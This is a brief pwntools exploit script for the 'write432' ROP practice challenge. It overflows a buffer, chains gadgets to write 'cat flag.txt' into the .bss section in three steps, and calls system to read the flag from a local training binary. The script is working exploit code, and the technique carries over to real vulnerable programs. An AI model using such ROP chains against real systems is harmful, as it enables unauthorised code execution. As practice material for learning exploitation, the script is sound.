from pwn import *

bin = './write432'
elf = ELF(bin)

'''
08048670 <usefulGadgets>:
 8048670:       89 2f                   mov    %ebp,(%edi)
 8048672:       c3                      ret

0x080486da : pop edi ; pop ebp ; ret

0x0804865a:       e8 d1 fd ff ff          call   8048430 <system@plt>

0804a040 start of bss

cat flag.txt
'''


useful_gadget = p32(0x08048670)
double_pop = p32(0x080486da)
bss = 0x0804a040
system = p32(0x0804865a)

#overflow
payload = 'A' * 44

#first write
payload += double_pop
payload += p32(bss)
payload += "cat "
payload += useful_gadget

#second write
payload += double_pop
payload += p32(bss+4)
payload += "flag"
payload += useful_gadget

#third write
payload += double_pop
payload += p32(bss+8)
payload += ".txt"
payload += useful_gadget

#system call
payload += system
payload += p32(bss)

#finger crossing and praying
p = process(bin)
print p.recv()

p.sendline(payload)
print p.recv()
